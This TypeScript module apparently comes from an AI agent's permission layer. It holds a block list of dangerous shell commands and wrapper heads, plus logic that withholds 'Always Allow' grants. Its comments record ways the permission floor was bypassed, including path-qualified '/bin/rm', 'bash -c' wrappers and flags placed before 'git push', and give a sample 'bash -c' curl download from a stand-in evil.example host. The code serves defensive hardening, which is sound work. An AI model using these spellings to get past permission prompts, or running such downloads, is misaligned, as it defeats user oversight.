/**
 * The ONE dangerous-command list, and the two predicates that read it.
 *
 * D1.284 — this list had two copies: the host's, a module-private `const`
 * inside `permission-manager.ts`, and the permission card's, in
 * `apps/electron/src/renderer/components/app-shell/input/structured/PermissionRequest.tsx`.
 * The copy existed for a stated reason (the host's list sat behind a class the
 * renderer cannot construct — it wants a workspace id, a session id and a root
 * path — and importing that class would pull the permission engine's whole
 * graph into the renderer bundle to answer a twenty-name lookup) and it was
 * pinned by a test that read the other file as SOURCE TEXT and asserted set
 * equality. This module is what that pin was standing in for: no imports, no
 * class, no I/O, so both sides can read it and there is nothing left to drift.
 *
 * TWO SHAPES live in one list, and the second was dead until D1.285: a one-word
 * entry names a base command, and a two-word entry names a base command plus
 * its first argument. Every caller used to look the list up with a one-word
 * base command, so `git push` and its three siblings matched nowhere — see
 * {@link isDangerousCommandLine}.
 *
 * "Dangerous" here means: always require permission in ask mode, never
 * auto-allow whatever the user configured, and never mint a grant that outlives
 * the session. It is not a claim that the command is harmful.
 */

/**
 * Commands that always require permission. One-word entries match the first
 * token of a command; two-word entries match the first two.
 */
export const DANGEROUS_COMMANDS: readonly string[] = [
  'rm', 'rmdir', 'sudo', 'su', 'chmod', 'chown', 'chgrp',
  'mv', 'cp', 'dd', 'mkfs', 'fdisk', 'parted',
  'kill', 'killall', 'pkill',
  'reboot', 'shutdown', 'halt', 'poweroff',
  'curl', 'wget', 'ssh', 'scp', 'rsync',
  // UA12.70 — the two-word entries below are upstream's grown list, verbatim
  // (craft-agents-oss v0.14.0 `packages/shared/src/agent/core/permission-remember.ts`
  // `DANGEROUS_COMMANDS`, Apache-2.0; owner default U43-SEC.1 (a)): destructive,
  // publishing or infrastructure-changing operations whose target is not in their
  // leading words. Their read-only listing forms (`git branch --list`,
  // `git stash list`, `git tag -l`) stay card-free because the read-only
  // allowlist is consulted before this floor (`shouldPromptInAskMode`).
  'git push', 'git reset', 'git rebase', 'git checkout', 'git clean', 'git restore', 'git switch',
  'git stash', 'git branch', 'git tag', 'git rm', 'git worktree', 'git gc', 'git reflog',
  'kubectl apply', 'kubectl delete', 'kubectl drain', 'kubectl replace',
  'helm install', 'helm upgrade', 'helm uninstall', 'helm rollback',
  'terraform apply', 'terraform destroy', 'tofu apply', 'tofu destroy', 'pulumi up', 'pulumi destroy',
  'npm publish', 'npm unpublish', 'pnpm publish', 'yarn publish', 'bun publish', 'cargo publish',
  'gem push', 'docker push', 'podman push',
  'netlify deploy', 'fly deploy', 'flyctl deploy', 'wrangler deploy', 'wrangler publish', 'firebase deploy',
];

const DANGEROUS_COMMAND_SET = new Set(DANGEROUS_COMMANDS);

/**
 * A leading `NAME=value` token — shell assignment syntax, not a command.
 *
 * Lower-cased before it is tested, because every reader here lower-cases the
 * whole line first, so the character class needs no upper-case half.
 */
const LEADING_ASSIGNMENT = /^[a-z_][a-z0-9_]*=/;

/**
 * D1.402 `[safety]` — the name a shell would resolve this token to.
 *
 * ## What it cost to look the raw token up
 *
 * `isDangerousCommandLine` compared `tokens[0]` verbatim against the list, so
 * every path-qualified spelling of a listed command escaped the floor entirely.
 * Measured at HEAD `dfc462e3c` (F1.12 safety review, findings #13 and #7 — the
 * same defect found twice, confirmed 3/3 by adversarial verifiers), with the
 * plain spellings as the controls:
 *
 * ```
 * /bin/rm -rf x                  false      rm -rf x              true
 * /usr/bin/sudo ls               false      sudo ls               true
 * /usr/bin/git push origin main  false      git push origin main  true
 * NODE_ENV=x rm -rf x            false
 * ```
 *
 * Because this predicate is the veto on the session whitelist and the refusal in
 * `SessionManager.persistBashAlwaysAllowRule`, one Always Allow on `/bin/rm -rf
 * dist` both auto-allowed every later `/bin/rm` line for the session AND wrote a
 * permanent repository-wide `Bash(/bin/rm *)` — where the identical `rm -rf
 * dist` card is refused both. The product's own removal circuit breaker had said
 * for a year that removals are "matched on the basename, so `/bin/rm` counts",
 * so this was a known class this predicate did not implement.
 *
 * ## The rule, and WHICH sibling it agrees with — measured, because the obvious
 * answer is wrong
 *
 * Take the last path segment, lower-case it, drop a `.exe` suffix. The sibling
 * that agrees is the REMOVAL CIRCUIT BREAKER, whose own header has said for a
 * year that removal commands are "matched on the basename, so `/bin/rm` counts";
 * driven 2026-09-19, `findRootOrHomeRemoval` fires on `/bin/rm -rf /`,
 * `/usr/bin/rm -rf ~` and `NODE_ENV=x rm -rf /` exactly as on the plain
 * spellings, and `bash-session-whitelist-dangerous-prefix.test.ts` pins that
 * agreement by driving both modules.
 *
 * The sibling that does NOT agree is the durable rule matcher, and assuming it
 * did would have been a wrong fix: driven the same day,
 * `matchClaudeBashRule('rm:*', '/bin/rm -rf x', { ruleAction: 'deny' })` answers
 * **no-match** while the plain `rm -rf x` answers match, and
 * `NODE_ENV=x rm -rf x` answers match. That asymmetry is correct and must stay:
 * a RULE is the administrator's literal text, and basenaming its pattern would
 * make `Bash(rm:*)` mean more than it says; a FLOOR is a refusal, and widening a
 * refusal can only ever add a card. So `resolvedCommandName`
 * (`pi-harness/claude-bash-rule.ts`) is the shape this copies, not a function
 * whose verdict this could import — and the import is refused anyway by this
 * module's header promise (no imports, no class, no I/O), which is what lets the
 * permission CARD in the renderer read the same list as the host.
 *
 * The `.exe` strip is the ONE place this is wider than the breaker: measured,
 * the breaker answers null for `rm.exe -rf /` on a posix host. Wider in the
 * refusing direction, on a spelling that IS the same program on win32.
 *
 * It cannot make the floor narrower: a token with no separator answers itself.
 */
export function commandHeadName(token: string): string {
  const base = (token.split(/[\\/]/).at(-1) ?? '').toLowerCase();
  return base.endsWith('.exe') ? base.slice(0, -4) : base;
}

/**
 * Where the command word starts, once leading `NAME=value` assignments are
 * stepped over.
 *
 * permissions.md's own wrapper rule — *"a deny or ask rule matches past any
 * leading assignment"* — is quoted in `claude-bash-rule.ts`, and the durable
 * engine has implemented it since it was written. `NODE_ENV=production rm -rf
 * dist` is `rm` to a shell and was not `rm` to this floor.
 *
 * An assignment is stepped over, never DESCENDED into: a head that names a
 * wrapper running its own argument (`env`, `xargs`, a shell's `-c`) is not
 * resolved here at all — {@link headNamesCommandInterpreter} withholds the grant
 * for that whole family instead, because descending would be a second parser.
 */
function headIndexAfterAssignments(tokens: readonly string[]): number {
  let index = 0;
  while (index < tokens.length && LEADING_ASSIGNMENT.test(tokens[index] ?? '')) index += 1;
  return index;
}

/**
 * D1.403 `[safety]` — heads that RUN THEIR OWN ARGUMENT, and may therefore never
 * be the base of a remembered grant.
 *
 * ## What one click bought
 *
 * Measured at HEAD `dfc462e3c` (F1.12 safety review, finding #14, confirmed 3/3
 * by adversarial verifiers): a card showing `bash -c "rm -rf dist"` was
 * classified as the harmless base `bash`, so the host wrote
 * `Bash(bash *)` into the repository's `.claude/settings.local.json` and stored
 * the session key `bash`. Both then matched `bash -c '<any script at all>'` —
 * a total bypass of the rule system and of the ask-mode floor, for the rest of
 * the session and permanently in that repository. Driven after the grant:
 * `bash -c "curl https://evil.example/x -o /tmp/x"`, `bash -lc "git push origin
 * main"` and `bash -c "rm -rf node_modules"` all answered NO PROMPT, where the
 * same commands written bare are refused any grant at all by the floor above.
 *
 * ## The decision, and it is a WITHHOLDING rather than a descent
 *
 * The grant is refused; the call is not. The card still offers Allow once — the
 * user can run the command — and only the Always-Allow half is withheld, which
 * is exactly what this list already does for every dangerous name. Descending
 * into the operand instead (`bash -c "npm test"` -> a grant on `npm test`) was
 * weighed and declined: reading `-c`/`-lc`/`-s`/`--` option syntax per
 * interpreter is a second parser, and a wrong descent MINTS a grant rather than
 * withholding one, so its failure direction is the dangerous one. The cost of
 * the simple rule is one extra click per invocation on a shape a user rarely
 * types by hand.
 *
 * `env FOO=1 npm test` therefore mints NOTHING — not a grant on `npm test`, and
 * not the grant on `env foo=1 npm test` it used to mint. `env -S "rm -rf ~"` is
 * a documented deny-floor bypass this product has already had to close once, so
 * `env` is treated as an interpreter and not as a prefix to step over. A bare
 * `NAME=value` assignment IS stepped over ({@link isDangerousCommandLine}),
 * because it is shell syntax rather than a program.
 *
 * ## Where the names come from
 *
 * The three sets `pi-harness/claude-bash-rule.ts` already maintains for the
 * durable engine — its shells, its simple wrappers and its exec wrappers — plus
 * `env`, `xargs` and `eval`, which the plan row names, plus `fish`, `exec`,
 * `command`, `time`, `timeout` and `nice`. It is deliberately a SUPERSET of the
 * engine's shell set and that is safe in one direction only: a name here costs a
 * user the "don't ask again" convenience, where a name missing here mints a
 * permanent repository rule. Measured 2026-09-19, `splitWithSubstitutions`
 * descends into `bash`, `sh`, `zsh` and `time` and does NOT descend into `fish`,
 * `env`, `xargs`, `eval`, `nohup`, `watch`, `timeout`, `nice`, `command` or
 * `exec` — so the engine's set is the narrower one, and the suite pins the
 * overlap by driving it rather than by reading its source.
 */
export const COMMAND_INTERPRETER_HEADS: readonly string[] = [
  'sh', 'bash', 'zsh', 'dash', 'ksh', 'csh', 'tcsh', 'fish',
  'env', 'eval', 'exec', 'command', 'xargs',
  'nohup', 'builtin', 'noglob', 'setsid', 'ionice', 'flock', 'watch',
  'time', 'timeout', 'nice',
  // UA12.70 — upstream v0.14.0's `COMMAND_WRAPPERS` (permission-remember.ts,
  // Apache-2.0) that were not named above: each runs another command given in
  // its arguments, so remembering it would approve anything.
  'sudo', 'su', 'doas', 'pkexec', 'gosu', 'runuser', 'run0', 'sg', 'newgrp', 'setpriv', 'chpst',
  'stdbuf', 'script', 'parallel', 'chroot', 'caffeinate', 'arch', 'unbuffer', 'strace', 'ltrace',
  'dtruss', 'sandbox-exec', 'firejail', 'bwrap', 'nsenter', 'unshare',
];

const COMMAND_INTERPRETER_SET = new Set(COMMAND_INTERPRETER_HEADS);

/**
 * Does this command line — or this base command — start with a head that runs
 * its own argument? See {@link COMMAND_INTERPRETER_HEADS}.
 *
 * Accepts either spelling for the same reason {@link isDangerousCommandLine}
 * does, and resolves the head the same way, so `/bin/bash -c …`,
 * `C:\Windows\System32\bash.exe -c …` and `NODE_ENV=x sh -c …` answer what
 * `bash -c …` answers.
 */
export function headNamesCommandInterpreter(command: string): boolean {
  const tokens = command.trim().toLowerCase().split(/\s+/);
  const head = commandHeadName(tokens[headIndexAfterAssignments(tokens)] ?? '');
  return head !== '' && COMMAND_INTERPRETER_SET.has(head);
}

/**
 * Is this command on the list?
 *
 * **THE CONTRACT, moved here by D1.307 from `requiresBashPermission`, which held
 * it for a year with zero product callers and was deleted rather than wired:** a
 * command on this list ALWAYS REQUIRES PERMISSION IN ASK MODE. That sentence is
 * the list's own header promise, and this is the predicate that keeps it —
 * `shouldPromptInAskMode`'s Bash arm and `SessionManager.persistBashAlwaysAllowRule`
 * are its readers, and both hand it the whole command line.
 *
 * Accepts EITHER a base command (`PermissionManager.getBaseCommand`'s output)
 * OR a whole command line, and a caller holding the whole line should pass the
 * whole line. D1.285 — the two-word entries could never match until this
 * matched them as a PREFIX of the first two tokens: driven at HEAD,
 * `git push origin main` answered `false` on both of the spellings
 * `SessionManager.persistBashAlwaysAllowRule` checks while `rm -rf build`
 * answered `true` (the control). The pair arm cannot fire without a second
 * token, so a base command handed in alone is answered exactly as before.
 *
 * UA12.86 `[security]` — when the raw-token read answers `false`, the line is
 * re-asked on the PARSED words ({@link parsePlainCommandArgv} +
 * `isDangerousArgv`, the reading the key side has applied since UA12.70): the
 * whitespace split keeps the quote characters, so `"git" push origin main`
 * looked up the head `"git"` and answered `false` while `git push` is on the
 * list. Measured 2026-10-05 at HEAD (origin: lane UA-cr7 P-UAcr7-2,
 * 2026-10-02), with `git status` and the plain spelling as the controls. The
 * re-ask fails closed and runs only after the raw answer was `false`, so it
 * can only REFUSE more — and every line it newly refuses was already refused a
 * key by the same argv read (`bashRememberKey` -> `isDangerousArgv`), so the
 * floor and the key can no longer disagree on a spelling. A line the parser
 * cannot read as one plain command (an operator, an expansion, an unterminated
 * quote) keeps the raw verdict — compound lines are split and re-asked per
 * SEGMENT by the callers, and an unparseable spelling descends nowhere here
 * (D1.403's declined second parser).
 */
export function isDangerousCommandLine(command: string): boolean {
  const all = command.trim().toLowerCase().split(/\s+/);
  // D1.402 — the head is RESOLVED before it is looked up: leading `NAME=value`
  // assignments are stepped over and a path-qualified spelling is taken down to
  // its basename. `/bin/rm -rf x` and `NODE_ENV=x rm -rf x` answered `false`
  // here while the plain `rm -rf x` answered `true`, and this floor is the veto
  // on both the session grant and the durable rule.
  const start = headIndexAfterAssignments(all);
  const tokens = start === 0 ? all : all.slice(start);
  const head = commandHeadName(tokens[0] ?? '');
  if (!head) return false;
  if (DANGEROUS_COMMAND_SET.has(head)) return true;
  const verb = commandHeadName(tokens[verbIndexAfterLeadingFlags(tokens, head)] ?? '');
  if (verb !== '' && DANGEROUS_COMMAND_SET.has(`${head} ${verb}`)) return true;
  // UA12.86 — the raw tokens keep their QUOTES, so `"git" push origin main`
  // looked up `"git"` and `git "push"` looked up `"push"`, and both missed the
  // list. Re-ask on the parsed words — the key side's own reading — before the
  // raw `false` is believed.
  const argv = parsePlainCommandArgv(command);
  return argv !== null && isDangerousArgv(argv);
}

/**
 * D1.316 — where the VERB is, once the head's own options are stepped over.
 *
 * The pair arm read `tokens[1]`, so a flag between the head and the verb walked
 * straight past the floor. Measured at HEAD, SIX spellings of one command
 * answered `false` where `git push origin main` answered `true`:
 *
 * ```
 * git -C /repo push            false      git -c user.name=x push   false
 * git --no-pager reset --hard  false      git -p push               false
 * git --git-dir=/x push        false      git --git-dir /x push     false
 * ```
 *
 * and with a broad `git` session key each of them was auto-allowed. This is the
 * floor D1.291, D1.305 and D1.314 all lean on — every one of them says "the
 * reader tests the whole command line" — so the step-over is a safety fix rather
 * than a tidy.
 *
 * ONE RULE, no per-command option table, and it fails CLOSED. A token starting
 * with `-` consumes itself, and additionally the token after it — because
 * `-C <path>`, `-c <k=v>` and `--git-dir <path>` take a separate value — UNLESS
 * that next token would itself form a dangerous pair with the head. That last
 * clause is what makes the rule safe without knowing which options take values:
 * `git -p push` (a boolean short option) cannot lose its `push` to a wrongly
 * assumed value, because `git push` is on the list and the skip is refused. A
 * next token that is itself a flag is never eaten as a value either.
 *
 * It can only ever step over tokens the list does not name, so it cannot widen
 * what is refused beyond the four entries: `git -C /repo status` and
 * `git --bare status` are still allowed, which the case list pins in both
 * directions.
 */
function verbIndexAfterLeadingFlags(tokens: readonly string[], head: string): number {
  let index = 1;
  while (index < tokens.length && (tokens[index] ?? '').startsWith('-')) {
    index += 1;
    const value = tokens[index];
    if (value === undefined || value.startsWith('-')) continue;
    if (DANGEROUS_COMMAND_SET.has(`${head} ${value}`)) continue;
    index += 1;
  }
  return index;
}

/**
 * Does this base command HEAD a two-word entry? `git` does, because `git push`
 * is on the list; nothing else does, so every one-word entry — `rm` included —
 * answers `false`.
 *
 * A DURABLE rule keyed on such a base is wider than the list allows:
 * `Bash(git *)` grants `git push` whatever the user was actually answering
 * about. A caller that persists a grant must narrow the key to the two tokens
 * the list reasons about, or refuse.
 */
export function headsDangerousCommandPair(baseCommand: string): boolean {
  // D1.402 — the same resolution as the floor's, so `/usr/bin/git` narrows and
  // refuses exactly as `git` does. Without it a path-qualified pair base carried
  // a base-wide durable rule (`Bash(/usr/bin/git *)`) covering its four refused
  // subcommands.
  const head = commandHeadName(baseCommand.trim());
  if (!head) return false;
  for (const entry of DANGEROUS_COMMAND_SET) {
    if (entry.startsWith(`${head} `)) return true;
  }
  return false;
}

/**
 * D1.291 — the KEY a Bash approval is remembered under for the remainder of the
 * SESSION, and the key a later command is looked up by.
 *
 * The session whitelist had D1.285's defect one layer down, and it was measured
 * by driving the shipped code: `claude-agent.ts`'s Always-Allow branch stored
 * `getBaseCommand`'s output — `git` for a `git push origin main` card — and
 * `shouldPromptInAskMode` then auto-allowed every `git` line for the rest of the
 * session. At HEAD, after one Always-Allow on `git push origin main`:
 *
 * ```
 * ask  mode: "git push origin main" prompt=false   "git commit -m x" prompt=false   "rm -rf build" prompt=true
 * auto mode: "git push origin main" prompt=false   "git reset --hard" prompt=false  "rm -rf build" prompt=true
 * ```
 *
 * The auto-mode row is the half the row this closes did not have: `auto` is a
 * hole too, because the session whitelist answers inside `shouldPromptInAskMode`
 * ABOVE `isRiskyAutoBashCommand`, so `AUTO_RISKY_BASH_PATTERNS` — which does
 * carry the git verbs — is never reached once anything is whitelisted. With an
 * EMPTY whitelist auto prompts for all three, which is the control.
 *
 * The rule is `SessionManager.persistBashAlwaysAllowRule`'s, one store over: a
 * base that HEADS a two-word entry is remembered at its subcommand, or not at
 * all. `git commit -m x` is remembered under `git commit`, so a later
 * `git commit -m y` is still auto-allowed (the control the fix has to keep)
 * while `git push` matches nothing. A second token that is a FLAG
 * (`git -C /repo push`) narrows nothing, so it is refused outright rather than
 * remembered at a key that does not mean what it says.
 *
 * ## D1.314 — the key is the NAMED PREFIX, not the base
 *
 * Until this row a non-pair base was remembered whole: an Always Allow on
 * `npm test` stored `npm`, and an Always Allow on `docker compose up -d` stored
 * `docker`. Measured at HEAD, that is what each click then bought:
 *
 * ```
 * Always Allow "npm test"            key "npm"     npm publish   prompt=false
 * Always Allow "docker compose up -d" key "docker" docker rm -f x prompt=false
 * ```
 *
 * So one approval of a test run bought `npm publish`, and one approval of a
 * container start bought `docker rm -f`. The key is now the command's LEADING
 * NON-FLAG TOKENS — what the card or the rule actually named — and the ask-mode
 * consult looks every leading-token prefix up, longest first, so a broader key
 * that something else stored still answers for a longer line.
 *
 * Flags end the prefix rather than joining it: options are per-invocation, so
 * `npm test --watch=false` and `npm test -u` are one grant, and `git -C /repo`
 * never becomes a key. It is deliberately NOT the whole line — a key of
 * `npm test --watch=false` would match only that spelling, which is D1.306's
 * defect in the other direction.
 *
 * ## UA12.70 `[security]` — the key EQUALS THE CLICK (upstream v0.14.0)
 *
 * D1.314's "leading non-flag tokens" was still wider than the click, measured at
 * HEAD `581f78cdc` by the 1.43.0 draft's `probe-remember-key.ts`: Always Allow
 * on `node -e "console.log(1)"` stored `node` (then `node evil.js` ran with no
 * card), on `python3 script.py` stored `python3 script.py` (then
 * `python3 script.py --delete-all`), on `npx prettier --check .` stored
 * `npx prettier` (then `--write .`), and on `git clean -n` / `git branch` /
 * `git stash` / `git tag` / `git restore --staged a` stored a key under which the
 * destructive form of the same subcommand ran card-free. On Pi and codex the
 * same click also wrote the durable `Bash(<key> *)`.
 *
 * The classification is now upstream's — craft-agents-oss v0.14.0
 * `packages/shared/src/agent/core/permission-remember.ts` `getBashRememberKey`
 * (Apache-2.0), ported in {@link bashRememberKey}: a single PLAIN command only
 * (no chain, pipe, redirect, assignment or expansion); CLIs with subcommands
 * keyed by at most three leading words before the first flag; single-purpose
 * commands by name; everything else — interpreters and runners included — by
 * its EXACT argv. No key for wrappers, a dangerous command, `gh api`, a flag
 * before the subcommand, or a destructive word among the leading words. Two
 * deliberate differences from upstream, both in the refusing direction: a shell
 * head mints nothing (D1.403 — upstream keys `bash -c "…"` by its exact argv),
 * and a bare CLI name (`npm`, `git`) is its own exact argv where upstream keys
 * the name, which would cover every non-dangerous subcommand; the launchers
 * (`open`, `code`, …) are keyed by exact argv, not by name (see `KEYED_BY_NAME`).
 *
 * @param command - the whole command line the user was shown, or the prefix a
 *   model-supplied rule named
 * @param baseCommand - `PermissionManager.getBaseCommand`'s output for it
 * @returns the key, or `null` when no key can honestly be minted
 */
export function bashSessionWhitelistKey(command: string, baseCommand: string): string | null {
  const base = baseCommand.trim().toLowerCase();
  if (!base) return null;
  // D1.403 — a head that runs its own argument is never a base. Both spellings
  // are asked, because `getBaseCommand` strips a leading `sudo` and
  // `sudo bash -c …` must refuse for this reason as well as for the privileged one.
  if (headNamesCommandInterpreter(base)) return null;
  return bashRememberKey(command);
}

/** UA12.70 — the prefix every exact-argv key carries; see {@link bashRememberKey}. */
export const EXACT_REMEMBER_KEY_PREFIX = 'exact:';

/** Is this stored key an exact-argv key (matched exactly, case kept), not a leading-words one? */
export function isExactRememberKey(key: string): boolean {
  return key.startsWith(EXACT_REMEMBER_KEY_PREFIX);
}

/** CLIs whose effect is decided by their leading words (upstream v0.14.0 `KEYED_BY_LEADING_WORDS`, verbatim). */
const KEYED_BY_LEADING_WORDS = new Set([
  'git', 'gh', 'glab', 'hg', 'svn',
  'npm', 'npx', 'pnpm', 'pnpx', 'yarn', 'bun', 'bunx', 'deno', 'pip', 'pip3', 'pipx', 'uv', 'uvx',
  'poetry', 'conda', 'gem', 'bundle', 'cargo', 'go', 'composer', 'brew', 'port', 'apt', 'apt-get',
  'dnf', 'yum', 'pacman', 'mise', 'asdf', 'nix',
  'make', 'just', 'rake', 'gradle', 'gradlew', 'mvn', 'dotnet', 'swift', 'xcodebuild', 'flutter',
  'dart', 'cmake', 'ninja', 'bazel',
  'docker', 'podman', 'kubectl', 'helm', 'terraform', 'tofu', 'pulumi', 'aws', 'gcloud', 'az',
  'doctl', 'fly', 'flyctl', 'vercel', 'netlify', 'wrangler', 'heroku', 'supabase', 'firebase',
  'systemctl', 'launchctl', 'service',
]);

/**
 * Single-purpose commands: the name alone says what they do (upstream
 * `KEYED_BY_NAME`). Six of upstream's thirteen are NOT here, a deliberate
 * reason-(b) security divergence: `open`, `xdg-open`, `code`, `cursor`, `subl`
 * and `zed` LAUNCH something their argv names — an application, a URL handler,
 * or an editor flag such as `code --install-extension` — so a by-name key would
 * cover launching anything; they fall through to the exact-argv key.
 */
const KEYED_BY_NAME = new Set([
  'mkdir', 'touch', 'pbcopy', 'say', 'afplay', 'notify-send', 'sleep',
]);

/** Leading words kept after the command name: enough for `gcloud compute instances delete`. */
const MAX_LEADING_WORDS = 3;

/**
 * A destructive verb among a keyed CLI's leading words means the target may come
 * after a flag (`aws s3 rm --recursive s3://prod`), outside the key: never
 * remembered. Upstream's `DESTRUCTIVE_WORD`, verbatim.
 */
const DESTRUCTIVE_WORD = /(?:^|[-:_])(?:rm|rb|rmi|del|delete|remove|destroy|terminate|purge|drop|prune|kill|wipe|reset|revoke|uninstall|unpublish|deregister)(?:$|[-:_])/i;

/** Subcommand pairs never remembered although their command is keyed: `gh api` decides its method with a flag. */
const NEVER_REMEMBERED_SUBCOMMANDS = new Set(['gh api']);

/** Commands and subcommands that execute whatever follows them: keyed by the exact argv. */
const RUNNER_COMMANDS = new Set(['npx', 'pnpx', 'bunx', 'uvx']);
const RUNNER_SUBCOMMANDS = new Set(['run', 'exec', 'x', 'dlx', 'run-script']);

/**
 * A leading word must be spellable bare: it was the text of a durable
 * `Bash(<key> *)` rule (the exact line since UA12.84), which the rule matcher
 * compares against the command's own text — a word that needed quoting would
 * make the rule mean something the key does not (upstream refuses only
 * whitespace; this is the narrower reading).
 */
const BARE_WORD = /^[A-Za-z0-9_.@:/+=,%^-]+$/;

/**
 * UA12.70 — the argv of a single PLAIN command, or `null`.
 *
 * Upstream reads this off `bash-parser` (`parseSimpleCommand`); this module has
 * no imports by its header promise (the permission card reads it), so the same
 * refusal is spelled as a small quote-aware scanner that fails CLOSED: any
 * unquoted shell operator or expansion character (`; & | < > ( ) { } $ \``
 * `* ? [ ] ! #` `~`), a `$` or backtick inside double quotes, a line terminator
 * anywhere, an unterminated quote or a leading `NAME=value` assignment answers
 * `null`, and `null` mints no key. Over-refusing costs one click; under-refusing
 * would mint a key for a command the key does not describe.
 */
export function parsePlainCommandArgv(command: string): string[] | null {
  const text = command.trim();
  if (!text || /[\r\n\u2028\u2029]/.test(text)) return null;
  const argv: string[] = [];
  let word = '';
  let inWord = false;
  let quote: '"' | "'" | null = null;
  for (let index = 0; index < text.length; index += 1) {
    const char = text[index]!;
    if (quote === "'") {
      if (char === "'") quote = null; else word += char;
      continue;
    }
    if (quote === '"') {
      if (char === '"') { quote = null; continue; }
      if (char === '$' || char === '`') return null;
      if (char === '\\') {
        const next = text[index + 1];
        if (next === undefined) return null;
        if ('"\\$`'.includes(next)) { word += next; index += 1; continue; }
      }
      word += char;
      continue;
    }
    if (/\s/.test(char)) {
      if (inWord) { argv.push(word); word = ''; inWord = false; }
      continue;
    }
    if (char === "'" || char === '"') { quote = char; inWord = true; continue; }
    if (char === '\\') {
      const next = text[index + 1];
      if (next === undefined) return null;
      word += next; index += 1; inWord = true;
      continue;
    }
    if (';&|<>(){}$`*?[]!#~'.includes(char)) return null;
    word += char;
    inWord = true;
  }
  if (quote !== null) return null;
  if (inWord) argv.push(word);
  if (argv.length === 0) return null;
  // A leading assignment is not a plain command (upstream: `node.prefix`).
  if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(text)) return null;
  return argv;
}

/** Does this argv run a dangerous command? The same floor as {@link isDangerousCommandLine}, on parsed words. */
function isDangerousArgv(argv: readonly string[]): boolean {
  const tokens = argv.map(token => token.toLowerCase());
  const head = commandHeadName(tokens[0] ?? '');
  if (!head) return true;
  if (DANGEROUS_COMMAND_SET.has(head)) return true;
  const verb = commandHeadName(tokens[verbIndexAfterLeadingFlags(tokens, head)] ?? '');
  return verb !== '' && DANGEROUS_COMMAND_SET.has(`${head} ${verb}`);
}

function exactRememberKey(argv: readonly string[]): string {
  return `${EXACT_REMEMBER_KEY_PREFIX}${JSON.stringify(argv)}`;
}

/**
 * UA12.70 — the key an Always Allow may store for this command line, or `null`
 * when the command must be asked about every time. Upstream v0.14.0
 * `getBashRememberKey` (permission-remember.ts, Apache-2.0), adapted as the
 * {@link bashSessionWhitelistKey} docblock states.
 *
 * Leading-words and by-name keys are lower-cased (the session store's spelling);
 * an exact key keeps its case, because `-n` and `-N` are different argv.
 */
export function bashRememberKey(command: string): string | null {
  if (headNamesCommandInterpreter(command) || isDangerousCommandLine(command)) return null;
  // UA12.87 — the producer of a line whose only plumbing is benign is keyed, and
  // the floor reads the producer as well as the raw line ({@link bashLineWithoutPlumbing}).
  const line = bashLineWithoutPlumbing(command);
  if (line !== command.trim() && (headNamesCommandInterpreter(line) || isDangerousCommandLine(line))) return null;
  const argv = parsePlainCommandArgv(line);
  if (!argv) return null;
  const name = commandHeadName(argv[0] ?? '');
  if (!name || COMMAND_INTERPRETER_SET.has(name) || isDangerousArgv(argv)) return null;

  if (KEYED_BY_LEADING_WORDS.has(name)) {
    if (argv.length === 1) return exactRememberKey(argv);
    const leading: string[] = [];
    for (const word of argv.slice(1, 1 + MAX_LEADING_WORDS)) {
      if (word.startsWith('-')) break;
      leading.push(word);
    }
    if (leading.length === 0) return null; // a flag before the subcommand
    if (NEVER_REMEMBERED_SUBCOMMANDS.has(`${name} ${(argv[1] ?? '').toLowerCase()}`)) return null;
    if (leading.some(word => DESTRUCTIVE_WORD.test(word))) return null;
    if (RUNNER_COMMANDS.has(name) || leading.some(word => RUNNER_SUBCOMMANDS.has(word.toLowerCase()))) {
      return exactRememberKey(argv);
    }
    const words = [argv[0] ?? '', ...leading];
    return words.every(word => BARE_WORD.test(word)) ? words.join(' ').toLowerCase() : null;
  }

  if (KEYED_BY_NAME.has(name)) return BARE_WORD.test(argv[0] ?? '') ? (argv[0] ?? '').toLowerCase() : null;
  return exactRememberKey(argv);
}

/**
 * UA12.70 — the durable rule TEXT one Always Allow writes (`Bash(<this>)`), so
 * the persisted rule is never wider than the approved class: an exact key
 * persists as the whole line with no ` *` (permissions.md#wildcard-patterns: "A
 * rule with no `*` matches one exact command"), a by-name key as `<name> *`.
 *
 * UA12.84 `[security]` — a LEADING-WORDS key persists as the exact line too
 * (controller decision (b), QUESTIONS.md "UA-cr7 / UA12.70 — the DURABLE rule
 * … admits extra positional words"). Its old `<key> *` admitted extra POSITIONAL
 * words after the key — `Bash(npm install lodash *)` covers
 * `npm install lodash evil-pkg` — on Pi and on the codex host gate, which read
 * the rule back through the permission DSL, while the session store beside it is
 * key-equal; the rule grammar has no "these words, then flags only" form. Claude's
 * own dialog stores the whole line, so this is the native shape. Decided beyond
 * the letter of (b), which names an approved argv with NO flags: a flagged line
 * (`npm install lodash --save-dev`) is also its own exact rule, because
 * `<key> *` for it would keep the very residue the row closes. Cost: a later
 * session asks again for a different flag spelling (`git status -s` after
 * `git status`); within the session the key still covers it.
 *
 * UA12.70 follow-up — `null` (no durable rule; the session grant stands) for an
 * exact key whose line holds a `*`: a QUOTED `*` passes the argv parser, but
 * the rule grammar reads `*` at any position as a wildcard (permissions.md#bash:
 * "Bash rules match the whole command text, with `*` standing in for any text."),
 * so `Bash(node -e "x*")` matched `node -e "x;<anything>"`. The page documents no
 * escape for a Bash `*`, so no rule text says the exact line.
 *
 * @param command - the line the card showed
 * @param key - {@link bashSessionWhitelistKey}'s answer for it (never null here)
 */
export function bashAlwaysAllowRuleContent(command: string, key: string): string | null {
  // A by-name key is one word (`touch`); a leading-words key always has two or more.
  if (!isExactRememberKey(key) && !/\s/.test(key)) return `${key} *`;
  // UA12.87 — the rule names the PRODUCER, as Claude's own dialog saves a rule per
  // subcommand that needs approval and matches a rule against the command, not
  // its fd-form redirect (permissions.md#compound-commands, #redirections).
  const line = bashLineWithoutPlumbing(command);
  return line.includes('*') ? null : line;
}

/**
 * UA12.87 `[ux]` — filters that cannot write a file or run a command (GNU and
 * BSD `tail`, `head`, `wc`, `grep`). Every one is on Claude's documented
 * read-only set (permissions.md#read-only-commands: "The set includes `ls`,
 * `cat`, `echo`, `pwd`, `head`, `tail`, `grep`, …").
 *
 * UA12.87 follow-up `[security]` — they are PLUMBING only while they read the
 * pipe: given a file operand each ignores stdin and reads that file, which the
 * same page keeps under Read deny rules and the working-directory check. So a
 * stage counts only when its argv cannot name a file ({@link filterStageReadsStdinOnly}).
 */
const READ_ONLY_PIPE_FILTERS = new Set(['tail', 'head', 'wc', 'grep']);

/** UA12.87 follow-up — a `tail`/`head` count: `-n 5`, `-n5`, `-20`, `--lines=20` (and `-c`/`--bytes`). */
const TAIL_HEAD_COUNT_FLAG = /^(?:-[nc][+-]?\d+|-\d+|--(?:lines|bytes)=[+-]?\d+)$/;
